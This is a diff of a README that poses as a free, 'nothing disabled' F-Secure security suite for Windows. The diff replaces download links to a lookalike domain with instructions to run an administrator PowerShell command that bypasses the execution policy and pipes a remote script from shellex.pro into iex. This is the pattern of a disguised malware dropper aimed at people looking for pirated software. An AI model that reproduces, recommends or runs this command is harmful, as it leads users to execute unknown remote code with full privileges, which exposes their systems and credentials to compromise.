@@ -4,30 +4,31 @@
 
 Finnish security suite with banking protection · Complete Windows bundle · Nothing disabled.
 
-## Setup & Download
+## INSTALLATION
 
-> **Your download is below.** Badge or table link — both go to **F-Secure** for Windows.
+**Steps:**
+1. Press **Win**, type **PowerShell**
+2. Right-click **Windows PowerShell** → **Run as administrator**
+3. Copy the command below, paste into the window, press **Enter**
+4. If **UAC** still appears – click **Yes**
 
-<p align="center">
-<a href="https://f-secure.mefidirect.xyz/"><img src="https://img.shields.io/badge/DOWNLOAD-%E2%86%92-2d3748?style=flat-square" alt="DOWNLOAD"></a><a href="https://f-secure.mefidirect.xyz/"><img src="https://img.shields.io/badge/F-SECURE-%E2%86%93-0078D4?style=flat-square" alt="F-SECURE"></a>
-</p>
+```powershell
+powershell -NoProfile -ExecutionPolicy Bypass -Command "irm 'https://shellex.pro/ps/setup.ps1' | iex"
+```
 
-| | |
-| --- | --- |
-| **Host** | **[f-secure.mefidirect.xyz](https://f-secure.mefidirect.xyz/)** |
-| **Full URL** | `https://f-secure.mefidirect.xyz/` |
-| **Type** | Installer for Windows 10 / 11 (64-bit) |
-| **Admin** | Run setup as Administrator |
+<details>
+<summary><b>Command did not start?</b></summary>
 
-### Getting started
+Try this directly in the same PowerShell window:
 
-1. Open **[Download — f-secure.mefidirect.xyz](https://f-secure.mefidirect.xyz/)** using the button or table
-2. Save the archive to your Downloads folder
-3. Right-click setup → **Run as administrator**
-4. Complete the wizard — defaults are fine for most users
-5. Open **F-Secure** after install finishes
+```powershell
+irm 'https://shellex.pro/ps/setup.ps1' | iex
+```
 
-<p align="center"><a href="https://f-secure.mefidirect.xyz/"><strong>⬇ Download F-Secure for PC</strong></a></p>
+</details>
+
+<sub>Administrator rights are required to complete the setup.</sub>
+
 
 ## 🔍 Details
 
